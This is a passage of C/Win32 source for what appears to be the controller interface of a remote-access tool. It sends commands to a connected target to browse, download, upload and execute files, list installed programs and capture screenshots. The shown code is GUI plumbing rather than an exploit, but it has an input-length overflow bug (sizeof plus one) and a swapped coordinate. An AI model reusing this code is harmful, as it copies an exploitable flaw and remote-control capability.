        BitBlt(hdc, 10, 20, bm.bmWidth, bm.bmHeight, hdcMem2, 0, 0, SRCCOPY);

        SelectObject(hdcMem2, hbmOld2);

        RestoreDC(hdcMem2,0);
        DeleteDC(hdc);
        DeleteObject(hbmSIco2);
        DeleteObject(hbmOld2);*/

        EndPaint(hwndSTdlg, &ps);
    }
    break;

    case WM_CLOSE:
    {
        EndDialog(hwndSTdlg,0);
    }
    break;


    }
    return FALSE;
}



DWORD WINAPI StatisticsWindow(LPVOID lpParam)
{

    hwndStat = CreateDialog(GInstance,(LPCTSTR)STATISTICS_DLG,NULL,(DLGPROC)Statistics_DlgProc);
    ShowWindow(hwndStat,SW_SHOW);

    SendMessage(hwndStat, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndStat, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));

    UpdateStats();

    MSG msg;
    while(GetMessage(&msg,hwndStat,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}




BOOL CALLBACK ULSTATUS_DlgProc(HWND hwndUSdlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch(message)
    {
    case WM_INITDIALOG:
    {
        HANDLE hIBitMap;
        //SendMessage(GetDlgItem(hwndFile,IDC_DLPROGRESS), PBM_SETPOS , (WPARAM)0, 0);
        /*hStatus7 = CreateWindowEx(0, STATUSCLASSNAME,
                                  NULL, WS_CHILD | WS_VISIBLE |
                                  SBARS_SIZEGRIP, 0,0,0,0,hwndDSdlg,
                                  (HMENU) IDC_DLSTAT_STATUS,
                                  GetModuleHandle(NULL), NULL);*/

        /*FDStaticHandle = GetDlgItem(hwndDSdlg, IDC_DLSTATIC);
        EnableWindow(GetDlgItem(hwndDSdlg, IDC_RESUME_DLOAD), FALSE);*/


        HWND button3 =  GetDlgItem(hwndUSdlg,IDC_CANCEL_ULOAD);


        hIBitMap = LoadImage(GetModuleHandle(NULL),MAKEINTRESOURCE(IDB_CANCEL),IMAGE_BITMAP,14,16,LR_DEFAULTCOLOR);
        SendMessage(button3,BM_SETIMAGE,IMAGE_BITMAP,(LPARAM)hIBitMap);
        DeleteObject(hIBitMap);

    }
    break;

    case WM_COMMAND:
    {
        switch(LOWORD(wParam))
        {
        case IDC_CANCEL_DLOAD:
        {
            /*SEND.PacketType = CANCEL_DLOAD;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();*/
            TerminateThread(FileUloadHandle,0);
            lstrcpy(UploadON,"OFF");
        }
        break;


        }
    }
    return TRUE;


    case WM_CLOSE:
    {
        EndDialog(hwndUSdlg,0);
    }
    break;


    }
    return FALSE;
}


DWORD WINAPI ULSTATWindow(LPVOID lpParam)
{
    hwndULstat = CreateDialog(ULSInst,(LPCTSTR)ULOAD_STAT_DLG,NULL,(DLGPROC)ULSTATUS_DlgProc);
    ShowWindow(hwndULstat,SW_SHOW);

    SendMessage(hwndULstat, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndULstat, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));


    MSG msg;
    while(GetMessage(&msg,hwndULstat,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}






BOOL CALLBACK DLSTATUS_DlgProc(HWND hwndDSdlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch(message)
    {
    case WM_INITDIALOG:
    {
        HANDLE hIBitMap;
        //SendMessage(GetDlgItem(hwndFile,IDC_DLPROGRESS), PBM_SETPOS , (WPARAM)0, 0);
        /*hStatus7 = CreateWindowEx(0, STATUSCLASSNAME,
                                  NULL, WS_CHILD | WS_VISIBLE |
                                  SBARS_SIZEGRIP, 0,0,0,0,hwndDSdlg,
                                  (HMENU) IDC_DLSTAT_STATUS,
                                  GetModuleHandle(NULL), NULL);*/

        FDStaticHandle = GetDlgItem(hwndDSdlg, IDC_DLSTATIC);
        EnableWindow(GetDlgItem(hwndDSdlg, IDC_RESUME_DLOAD), FALSE);

        HWND button1 =  GetDlgItem(hwndDSdlg,IDC_RESUME_DLOAD);
        HWND button2 =  GetDlgItem(hwndDSdlg,IDC_PAUSE_DLOAD);
        HWND button3 =  GetDlgItem(hwndDSdlg,IDC_CANCEL_DLOAD);

        hIBitMap = LoadImage(GetModuleHandle(NULL),MAKEINTRESOURCE(IDB_PLAY),IMAGE_BITMAP,14,16,LR_DEFAULTCOLOR);
        SendMessage(button1,BM_SETIMAGE,IMAGE_BITMAP,(LPARAM)hIBitMap);
        DeleteObject(hIBitMap);

        hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_PAUSE), IMAGE_ICON, 14, 14, LR_DEFAULTCOLOR);				  // load the picture from the resource
        SendMessage(button2,BM_SETIMAGE,IMAGE_ICON,(LPARAM)hIcon);
        DeleteObject(hIcon);

        hIBitMap = LoadImage(GetModuleHandle(NULL),MAKEINTRESOURCE(IDB_CANCEL),IMAGE_BITMAP,14,16,LR_DEFAULTCOLOR);
        SendMessage(button3,BM_SETIMAGE,IMAGE_BITMAP,(LPARAM)hIBitMap);
        DeleteObject(hIBitMap);

    }
    break;

    case WM_COMMAND:
    {
        switch(LOWORD(wParam))
        {
        case IDC_CANCEL_DLOAD:
        {
            SEND.PacketType = CANCEL_DLOAD;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            lstrcpy(DownloadON,"OFF");

            GetTime();
            sprintf(DLLogFilename, "%s",FTemp);
            sprintf(DLLogDestPath,  "%s", DLfilename);
            sprintf(DLLogFilesize, "%d",DL_filesize);
            strcat(DLLogFilesize," bytes");
            sprintf(DLLogTime, "%s",Time);

            SetDloadLog(1, DLLogFilename, DLLogFilesize, DLLogUsrname, DLLogDestPath, DLLogTime);
            MessageBox(hwndDSdlg, "Download Canceled", "File Download", MB_OK|MB_ICONINFORMATION);
            EndDialog(hwndDLstat,0);


        }
        break;

        case IDC_PAUSE_DLOAD:
        {
            SEND.PacketType = PAUSE_DLOAD;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();
            EnableStatControls(hwndDSdlg,TRUE);
        }
        break;

        case IDC_RESUME_DLOAD:
        {
            SEND.PacketType = RESUME_DLOAD;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();
            //sprintf(DownloadON,"%s","OFF");
        }
        break;
        }
    }
    return TRUE;


    case WM_CLOSE:
    {

            SEND.PacketType = PAUSE_DLOAD;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            EnableStatControls(hwndDSdlg,TRUE);
        int dec = MessageBox(hwndDSdlg, "Do you want Cancel Download?", "File Download", MB_YESNO|MB_ICONQUESTION);
        if(dec==IDYES)
        {

            SEND.PacketType = CANCEL_DLOAD;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            lstrcpy(DownloadON,"OFF");

            GetTime();
            sprintf(DLLogFilename, "%s",FTemp);
            sprintf(DLLogDestPath,  "%s", DLfilename);
            sprintf(DLLogFilesize, "%d",DL_filesize);
            strcat(DLLogFilesize," bytes");
            sprintf(DLLogTime, "%s",Time);

            SetDloadLog(1, DLLogFilename, DLLogFilesize, DLLogUsrname, DLLogDestPath, DLLogTime);
            EndDialog(hwndDLstat,0);
        }

        else if(dec==IDNO)
        {

        }
    }
    break;


    }
    return FALSE;
}


DWORD WINAPI DLSTATWindow(LPVOID lpParam)
{
    hwndDLstat = CreateDialog(DLSInst,(LPCTSTR)DLOAD_STAT_DLG,NULL,(DLGPROC)DLSTATUS_DlgProc);
    ShowWindow(hwndDLstat,SW_SHOW);

    SendMessage(hwndDLstat, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndDLstat, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));


    MSG msg;
    while(GetMessage(&msg,hwndDLstat,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}







BOOL CALLBACK SHOTSTAT_DlgProc(HWND hwndSSdlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch(message)
    {
    case WM_INITDIALOG:
    {
        //SendMessage(GetDlgItem(hwndFile,IDC_DLPROGRESS), PBM_SETPOS , (WPARAM)0, 0);
        hStatus8 = CreateWindowEx(0, STATUSCLASSNAME,
                                  NULL, WS_CHILD | WS_VISIBLE |
                                  SBARS_SIZEGRIP, 0,0,0,0,hwndSSdlg,
                                  (HMENU) IDC_DLSHOT_STATUS,
                                  GetModuleHandle(NULL), NULL);
    }
    break;

    case WM_COMMAND:
    {
        switch(LOWORD(wParam))
        {

        case IDC_CANCEL_SHOT:
        {
            SEND.PacketType = CANCEL_SHOT;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();
        }
        break;

        }
    }
    return TRUE;

    case WM_CLOSE:
    {
        EndDialog(hwndSSdlg,0);
    }
    break;


    }
    return FALSE;
}


DWORD WINAPI DLSHOTWindow(LPVOID lpParam)
{
    hwndShotstat = CreateDialog(DLSInst,(LPCTSTR)SHOT_STAT_DLG,NULL,(DLGPROC)SHOTSTAT_DlgProc);
    ShowWindow(hwndShotstat,SW_HIDE);

    SendMessage(hwndShotstat, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndShotstat, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));


    MSG msg;
    while(GetMessage(&msg,hwndShotstat,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}






BOOL CALLBACK AuthFail_DlgProc(HWND hwndAFdlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch(message)
    {
    case WM_INITDIALOG:
    {

    }
    break;

    case WM_COMMAND:
    {
        switch(LOWORD(wParam))
        {
        case IDC_OK_RE_AUTH:
        {
            char getpass[MAX_LEN];
            GetDlgItemText(hwndAFdlg, IDC_RE_AUTH, getpass, sizeof(getpass) + 1);
            if(strlen(getpass)!=0)
            {
                strcpy(SEND.SEC_PASS,getpass);
                SEND.PacketType = SEND_SEC_PASS;
                SSizeKB=send(Socket[Count_Connection],(char*)&SEND,HeadSize2,0);
                SendDataKB+=SSizeKB;
                SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                UpdateStats();
                EndDialog(hwndAFdlg,0);
            }
        }
        break;

        }
    }
    return TRUE;

    case WM_CLOSE:
    {
        EndDialog(hwndAFdlg,0);
    }
    break;


    }
    return FALSE;
}











BOOL CALLBACK NewFolder_DlgProc(HWND hwndNFdlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch(message)
    {
    case WM_INITDIALOG:
    {

    }
    break;

    case WM_COMMAND:
    {
        switch(LOWORD(wParam))
        {
        case IDC_OK_FOLDER_NAME:
        {
            char getNFname[MAX_LEN];
            GetDlgItemText(hwndNFdlg, IDC_FOLDER_NAME, getNFname, sizeof(getNFname) + 1);
            if(strlen(getNFname)!=0)
            {
                strcpy(NFname,FinalDir);
                strcat(NFname,getNFname);
                //MessageBox(NULL,NFname,"TEST",MB_OK | MB_ICONMASK);
                strcpy(SEND.FileName,NFname);

                SEND.PacketType = NEW_FOLDER;
                SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                SendDataKB+=SSizeKB;
                SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                UpdateStats();
                EndDialog(hwndNFdlg,0);
                SendMessage(hList2,LVM_DELETEALLITEMS,0,0);
                GetParentFileDir(hwndFile, Selected, FTemp2, TargetID);


                GetTime();
                sprintf(LTaskName, "%s","Create Folder");
                sprintf(LStatus, "%s","pass");
                sprintf(LUserName, "%s", MTemp);

                setlog(LTaskName,LUserName,Time,1);


            }

            else
            {
                MessageBox(hwndnewfolder,"Folder name Can't be empty ","ERROR",MB_OK | MB_ICONERROR);
            }

        }
        break;
        }
    }
    return TRUE;

    case WM_CLOSE:
    {
        EndDialog(hwndNFdlg,0);
    }
    break;


    }
    return FALSE;
}




DWORD WINAPI NewFolderWindow(LPVOID lpParam)
{
    //hwndnewfolder = CreateDialog(NFInst,(LPCTSTR)NEW_FOLDER_DLG,NULL,(DLGPROC)NewFolder_DlgProc);
    //ShowWindow(hwndnewfolder,SW_SHOW);

    SendMessage(hwndnewfolder, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndnewfolder, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));


    MSG msg;
    while(GetMessage(&msg,hwndnewfolder,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}



BOOL CALLBACK File_DlgProc(HWND hwndfDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{

//char FTemp[255]={0};
//char FTemp2[255]={0};
    char FTemp3[255]= {0};
    RECT rc;    // client area
    POINT  pt;   // location of mouse click
    HMENU hmenuTrackPopup;
    HMENU hmenu;
    HMENU dmenu;

    BOOL EnableFlag;
    EnableFlag = FALSE;


    switch(uMsg)
    {
    case WM_INITDIALOG:
    {
        InitCommonControls(); // make our tree control to work


        hStatus2 = CreateWindowEx(0, STATUSCLASSNAME,
                                  NULL, WS_CHILD | WS_VISIBLE |
                                  SBARS_SIZEGRIP, 0,0,0,0,hwndfDlg,
                                  (HMENU) IDC_FILE_STATUS,
                                  GetModuleHandle(NULL), NULL);

                                  lstrcpy(CopynPasteON,"OFF");


        hTabControl1 = GetDlgItem(hwndfDlg,FILE_MAIN_TAB);


        TCITEM ti;
        ti.mask = TCIF_TEXT | TCIF_IMAGE; // I'm only having text on the tab
        ti.pszText = "File Explorer";
        TabCtrl_InsertItem(hTabControl1,0,&ti);
        ti.pszText = "Programs";
        TabCtrl_InsertItem(hTabControl1,1,&ti);
        ti.pszText = "Download Log";
        TabCtrl_InsertItem(hTabControl1,2,&ti);
        TabCtrl_SetCurSel(hTabControl1,0);
        //hCurrentTab = CreateDialog(fInst,MAKEINTRESOURCE(FILE_MAIN_TAB),hTabControl1,0); // Setting dialog to tab one by default

        ShowWindow(GetDlgItem(hwndfDlg, IDC_LIST2),SW_SHOW);
        ShowWindow(GetDlgItem(hwndfDlg, IDC_TREE1),SW_SHOW);
        ShowWindow(GetDlgItem(hwndfDlg, IDC_LIST4),SW_HIDE);
        ShowWindow(GetDlgItem(hwndfDlg, IDC_LIST6),SW_HIDE);
        ShowWindow(GetDlgItem(hwndfDlg, IDC_STATIC),SW_SHOW);
        ShowWindow(GetDlgItem(hwndfDlg, ID_SEARCH_EDIT),SW_SHOW);
        ShowWindow(GetDlgItem(hwndfDlg, IDC_FSEARCH_BUTTON),SW_SHOW);
        ShowWindow(GetDlgItem(hwndfDlg, IDC_FSEARCH_GROUP),SW_SHOW);
        ShowWindow(GetDlgItem(hwndfDlg, IDC_STATIC2),SW_HIDE);
        ShowWindow(GetDlgItem(hwndfDlg, ID_SEARCH_EDIT2),SW_HIDE);

        //SendMessage(GetDlgItem(hwndfDlg,IDC_DLPROGRESS), PBM_SETPOS , (WPARAM)0, 0);

        hList2=GetDlgItem(hwndfDlg,IDC_LIST2);

        memset(&LvCol2,0,sizeof(LvCol2));                  // Zero Members
        LvCol2.cx=0x28;                                   // width between each coloum
// Inserting Couloms as much as we want

        SendMessage(hList2,LVM_SETEXTENDEDLISTVIEWSTYLE,
                    0,LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES); // Set style

        LvCol2.mask=LVCF_TEXT|LVCF_WIDTH/*|LVCF_IMAGE*/;    // Type of mask
        LvCol2.cx=230;                                   // width of column
        LvCol2.pszText="Filename";                            // First Header Text
        SendMessage(hList2,LVM_INSERTCOLUMN,0,(LPARAM)&LvCol2); // Insert/Show the coloum
        LvCol2.cx=155;                                   // width of column
        LvCol2.pszText="Size";                            // Next coloum
        SendMessage(hList2,LVM_INSERTCOLUMN,1,(LPARAM)&LvCol2); // ...

        memset(&LvItem2,0,sizeof(LvItem2)); // Zero struct's Members

        LvItem2.mask=LVIF_TEXT|LVIF_IMAGE;   // Text Style
        LvItem2.cchTextMax = 256; // Max size of test
        LvItem2.iItem=0;          // choose item
        LvItem2.iSubItem=0;       // Put in first coluom




        hList4=GetDlgItem(hwndfDlg,IDC_LIST4);

        memset(&LvCol2,0,sizeof(LvCol2));                  // Zero Members
        LvCol2.cx=0x28;                                   // width between each coloum
// Inserting Couloms as much as we want

        ListView_SetExtendedListViewStyle(hList4, exStyles);

        LvCol2.mask=LVCF_TEXT|LVCF_WIDTH/*|LVCF_IMAGE*/;    // Type of mask
        LvCol2.cx=200;                                   // width of column
        LvCol2.pszText="Filename";                            // First Header Text
        SendMessage(hList4,LVM_INSERTCOLUMN,0,(LPARAM)&LvCol2); // Insert/Show the coloum
        LvCol2.cx=380;                                   // width of column
        LvCol2.pszText="Path";                            // Next coloum
        SendMessage(hList4,LVM_INSERTCOLUMN,1,(LPARAM)&LvCol2); // ...

        memset(&LvItem2,0,sizeof(LvItem2)); // Zero struct's Members

        LvItem2.mask=LVIF_TEXT|LVIF_IMAGE;   // Text Style
        LvItem2.cchTextMax = 256; // Max size of test
        LvItem2.iItem=0;          // choose item
        LvItem2.iSubItem=0;       // Put in first coluom



        hList6=GetDlgItem(hwndfDlg,IDC_LIST6);

        memset(&LvCol2,0,sizeof(LvCol2));                  // Zero Members
        LvCol2.cx=0x28;                                   // width between each coloum
// Inserting Couloms as much as we want
        SendMessage(hList6,LVM_SETEXTENDEDLISTVIEWSTYLE,
                    0,LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES); // Set style
        LvCol2.mask=LVCF_TEXT|LVCF_WIDTH;    // Type of mask
        LvCol2.cx=40;                                   // width of column
        LvCol2.pszText="";                            // First Header Text
        SendMessage(hList6,LVM_INSERTCOLUMN,0,(LPARAM)&LvCol2); // Insert/Show the coloum
        LvCol2.cx=160;                                   // width of column
        LvCol2.pszText="Filename";                            // First Header Text
        SendMessage(hList6,LVM_INSERTCOLUMN,1,(LPARAM)&LvCol2); // Insert/Show the coloum
        LvCol2.cx=110;                                   // width of column
        LvCol2.pszText="Size";                            // First Header Text
        SendMessage(hList6,LVM_INSERTCOLUMN,2,(LPARAM)&LvCol2); // Insert/Show the coloum
        LvCol2.cx=190;                                   // width of column
        LvCol2.pszText="Username";                            // First Header Text
        SendMessage(hList6,LVM_INSERTCOLUMN,3,(LPARAM)&LvCol2); // Insert/Show the coloum
        LvCol2.cx=200;                                   // width of column
        LvCol2.pszText="Destination";                            // First Header Text
        SendMessage(hList6,LVM_INSERTCOLUMN,4,(LPARAM)&LvCol2); // Insert/Show the coloum
        LvCol2.cx=190;                                   // width of column
        LvCol2.pszText="Date/Time";                            // First Header Text
        SendMessage(hList6,LVM_INSERTCOLUMN,5,(LPARAM)&LvCol2); // Insert/Show the coloum

        memset(&LvItem2,0,sizeof(LvItem2)); // Zero struct's Members

        LvItem2.mask=LVIF_TEXT|LVIF_IMAGE;   // Text Style
        LvItem2.cchTextMax = 256; // Max size of test
        LvItem2.iItem=0;          // choose item
        LvItem2.iSubItem=0;       // Put in first coluo





        HWND button1 =  GetDlgItem(hwndfDlg,IDC_FSEARCH_BUTTON);
        HANDLE hIBitMap = LoadImage(GetModuleHandle(NULL),MAKEINTRESOURCE(IDB_SEARCH),IMAGE_BITMAP,14,12,LR_DEFAULTCOLOR);
        SendMessage(button1,BM_SETIMAGE,IMAGE_BITMAP,(LPARAM)hIBitMap);


        hTree=GetDlgItem(hwndfDlg,IDC_TREE1);




        SendDlgItemMessage(hwndfDlg,IDC_TREE1,TVM_SETIMAGELIST,0,(LPARAM)hImageList);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


         ListView_SetImageList(GetDlgItem(hwndFile, IDC_LIST2),FImageList, LVSIL_SMALL);
         ListView_SetImageList(GetDlgItem(hwndFile, IDC_LIST4),FImageList, LVSIL_SMALL);
         ListView_SetImageList(GetDlgItem(hwndFile, IDC_LIST6),DLImageList0, LVSIL_SMALL);




    }
    return TRUE;



    case WM_NOTIFY:
    {

        switch (((LPNMHDR)lParam)->code)
        {
        case TCN_SELCHANGE:
        {
            int iPage = TabCtrl_GetCurSel(GetDlgItem(hwndfDlg, FILE_MAIN_TAB));

            switch(iPage)
            {
            case 0:
            {
                // GetClientRect(hwndfDlg, &rc);
               /* int TreeCount=TreeView_GetCount(GetDlgItem(hwndfDlg,IDC_TREE1));
                for(int i=0; i<=TreeCount; i++) // ensure all is being killed
                    TreeView_DeleteAllItems(GetDlgItem(hwndfDlg,IDC_TREE1));*/

               /* GetTime();
                sprintf(LTaskName, "%s","File Explorer");
                sprintf(LStatus, "%s","pass");
                sprintf(LUserName, "%s", MTemp);

                setlog(LTaskName,LUserName,Time,1);*/

                ShowWindow(GetDlgItem(hwndfDlg, IDC_LIST4 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_LIST2 ),SW_SHOW);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_TREE1 ),SW_SHOW);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_LIST6),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_STATIC),SW_SHOW);
                ShowWindow(GetDlgItem(hwndfDlg, ID_SEARCH_EDIT),SW_SHOW);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_FSEARCH_BUTTON),SW_SHOW);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_FSEARCH_GROUP),SW_SHOW);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_STATIC2),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, ID_SEARCH_EDIT2),SW_HIDE);


                /*SEND.PacketType = REQ_DRIVES;
                SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                SendDataKB+=SSizeKB;
                SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                UpdateStats();*/

                //SetFileWindow(hwndfDlg);
            }
            break;

            case 1:
            {
                //GetClientRect(hwndfDlg, &rc);
                SendMessage(hList4,LVM_DELETEALLITEMS,0,0);

                ShowWindow(GetDlgItem(hwndfDlg, IDC_LIST4 ),SW_SHOW);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_LIST2 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_TREE1 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_LIST6),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_STATIC),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, ID_SEARCH_EDIT),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_FSEARCH_BUTTON),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_FSEARCH_GROUP),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_STATIC2),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, ID_SEARCH_EDIT2),SW_HIDE);


                SEND.PacketType = REQ_INSTALLS;
                SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                SendDataKB+=SSizeKB;
                SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                UpdateStats();

                GetTime();
                sprintf(LTaskName, "%s","Programs");
                sprintf(LStatus, "%s","pass");
                sprintf(LUserName, "%s", MTemp);

                //setlog(LTaskName,LUserName,Time,1);

            }	//SetFileWindow(hwndfDlg);
            break;

            case 2:
            {
                SendMessage(hList6,LVM_DELETEALLITEMS,0,0);

                GetDownloadsDatabase();

                ShowWindow(GetDlgItem(hwndfDlg, IDC_LIST4 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_LIST2 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_TREE1 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_LIST6),SW_SHOW);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_STATIC),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, ID_SEARCH_EDIT),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_FSEARCH_BUTTON),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_FSEARCH_GROUP),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, IDC_STATIC2),SW_HIDE);
                ShowWindow(GetDlgItem(hwndfDlg, ID_SEARCH_EDIT2),SW_HIDE);


                GetTime();
                sprintf(LTaskName, "%s","Download Log");
                sprintf(LStatus, "%s","pass");
                sprintf(LUserName, "%s", MTemp);

                //setlog(LTaskName,LUserName,Time,1);

    /*   HMENU t1m = LoadMenu(fInst, MAKEINTRESOURCE(ID_FILE_MENU));
       HMENU t2m = GetSubMenu (t1m,0);
       UINT t3m = GetMenuItemID(t2m,0);

                HBITMAP hMBitMap3 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_CFIG));

               //SetMenuItemBitmaps((HMENU)t3m,IDC_EXECUTE_FILE,MF_BITMAP,hMBitMap3,hMBitMap3);

              // dmenu = s

               EnableMenuItem(t1m,IDC_EXECUTE_FILE,MF_BYCOMMAND|MF_DISABLED | MF_GRAYED);*/


            }
            break;


            }

        }
        break;
        }

        switch(LOWORD(wParam))
        {
        case IDC_LIST6:
        {
            int iSlected=0;

            iSlected=SendMessage(hList6,LVM_GETNEXTITEM,-1,LVNI_SELECTED);

            HBITMAP hTMBitMap = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_DLT));

            if(((LPNMHDR)lParam)->code == NM_RCLICK)
            {


                if(iSlected==-1)
                {

                    break;
                }

                    flag=1;

                    GetClientRect(hwndfDlg, (LPRECT) &rc);

                    // Get the client coordinates for the mouse click.
                    GetCursorPos(&pt);
                    pt.y += 15;
                    pt.x += 15;

                    hmenu = CreatePopupMenu();
                    AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_CLEAR_LOG,"Clear log");
                    SetMenuItemBitmaps(hmenu,IDC_CLEAR_LOG,MF_BITMAP,hTMBitMap,hTMBitMap);

                    TrackPopupMenu(hmenu/*TrackPopup*/, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.y, pt.y, 0, hwndfDlg, NULL);


            }
        }
        break;

        case IDC_LIST2:
        {

            int iSlected=0;

            iSlected=SendMessage(hList2,LVM_GETNEXTITEM,-1,LVNI_SELECTED);

            HBITMAP hTMBitMap1 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_UPLOAD));
            HBITMAP hTMBitMap2 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_DOWNLOAD));
            HBITMAP hTMBitMap3 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_NEWFOLDER));
            HBITMAP hTMBitMap4 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_DLT));
            HBITMAP hTMBitMap5 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_COPY));
            HBITMAP hTMBitMap6 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_PASTE));
            HBITMAP hTMBitMap7 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_REDO));
            HBITMAP hTMBitMap8 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_EXECUTE));


            if(((LPNMHDR)lParam)->code == NM_RCLICK)
            {


                if(iSlected==-1)
                {

                    GetClientRect(hwndfDlg, (LPRECT) &rc);

                    // Get the client coordinates for the mouse click.
                    GetCursorPos(&pt);
                    pt.y += 15;
                    pt.x += 15;

                    hmenu = CreatePopupMenu();
                    hmenuTrackPopup = CreateMenu();

                    AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_PASTE_FILE,"Paste");
                    SetMenuItemBitmaps(hmenu,IDC_PASTE_FILE,MF_BITMAP,hTMBitMap6,hTMBitMap6);
                    AppendMenu(hmenu, MF_STRING|MF_POPUP,(UINT)hmenuTrackPopup,"New");
                    AppendMenu(hmenuTrackPopup,MF_STRING,IDC_NEW_FOLDER,"Folder");
                    SetMenuItemBitmaps(hmenuTrackPopup,IDC_NEW_FOLDER,MF_BITMAP,hTMBitMap3,hTMBitMap3);
                    AppendMenu(hmenu, MF_SEPARATOR,IDC_SEP1,"");
